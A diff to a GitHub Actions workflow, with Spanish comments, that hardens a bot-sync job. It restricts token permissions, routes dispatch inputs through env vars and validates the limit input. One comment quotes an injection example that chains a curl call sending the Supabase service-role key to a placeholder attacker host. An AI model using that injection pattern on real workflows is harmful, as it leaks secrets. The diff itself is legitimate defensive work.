@@ -56,6 +56,13 @@ on:
         required: false
         default: 'false'
 
+# Mig 100 (2026-05-30, audit adversarial): restringir permisos del
+# GITHUB_TOKEN al mínimo necesario. Sin esto, hereda write a todos los
+# scopes del repo → un atacante con commit access que dispare este
+# workflow podría modificar issues, releases, etc.
+permissions:
+  contents: read
+
 # No correr múltiples al mismo tiempo
 concurrency:
   group: bot-sync-prod
@@ -154,10 +161,24 @@ jobs:
           SUPABASE_URL:              ${{ secrets.SUPABASE_URL }}
           SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
           BOT_SYNC_COUNTRY:          ${{ matrix.country }}
+          # Mig 100 (audit adversarial 2026-05-30): pasamos workflow_dispatch
+          # inputs como env vars en lugar de interpolarlos directamente en
+          # bash. Sin esto, un input crafteado como
+          #   `5000; curl attacker.com -d "$SUPABASE_SERVICE_ROLE_KEY"`
+          # se ejecutaría con los secrets expuestos.
+          INPUT_LIMIT:      ${{ inputs.limit }}
+          INPUT_PROBE_ONLY: ${{ inputs.probe_only }}
         run: |
+          set -euo pipefail
           cd scripts/bot-sync
-          if [ "${{ inputs.probe_only }}" = "true" ]; then
+          # Validar y sanitizar inputs: limit debe ser entero positivo.
+          LIMIT="${INPUT_LIMIT:-5000}"
+          if ! [[ "$LIMIT" =~ ^[0-9]+$ ]]; then
+            echo "::error::limit inválido (debe ser entero positivo): $LIMIT"
+            exit 1
+          fi
+          if [ "$INPUT_PROBE_ONLY" = "true" ]; then
             python bot_sync_push.py --probe
           else
-            python bot_sync_push.py --limit ${{ inputs.limit || '5000' }}
+            python bot_sync_push.py --limit "$LIMIT"
           fi
